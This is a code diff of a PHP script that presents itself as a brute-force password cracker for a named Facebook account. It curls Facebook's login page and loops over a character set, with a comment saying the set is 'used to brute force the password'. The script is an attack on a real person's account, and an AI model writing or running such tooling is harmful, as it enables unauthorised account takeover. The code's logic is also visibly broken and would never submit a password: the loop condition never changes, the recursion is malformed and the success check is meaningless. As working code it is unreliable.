@@ -5,11 +5,11 @@ global $startpagina;
 $time = microtime() * 100000;
 $username = "kenkensquidkuddlephish";
 echo "https://twitter.com/LizardL4nds";
-define('P_MAX_LEN', 12);
 $Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
 $c_len = strlen($Pass); 
-
-function bruteForce($width, $position)
+$min = 1;
+$max = 12;
+function bruteForce($min, $max, $Pass)
 {     
 	
         $c = curl_init('https://www.facebook.com/login');
@@ -24,17 +24,14 @@ function bruteForce($width, $position)
         $str = curl_exec($c); // Get it
         curl_close($c); 
 		
-	for ($i = 1; $i < 12; $i++) 
+	for ($i = $min; $min < $max; $i++) 
 	{        
-		if (1 < 12 - 1) 
+		if ($min < $max - 1) 
 		{    
-			bruteForce(1, 12 + 1, $Pass[$i]); 
-		}
-		     
+			bruteForce($min, $max + 1, $Pass[$i]); 		     
 			if($str != "What's on your mind?") {echo "Password:".$Pass[$i]."";}
                         else {echo "Bruting...";}
+		}
         }
 } 
-bruteForce(P_MAX_LEN, 12, '');
-
 ?>
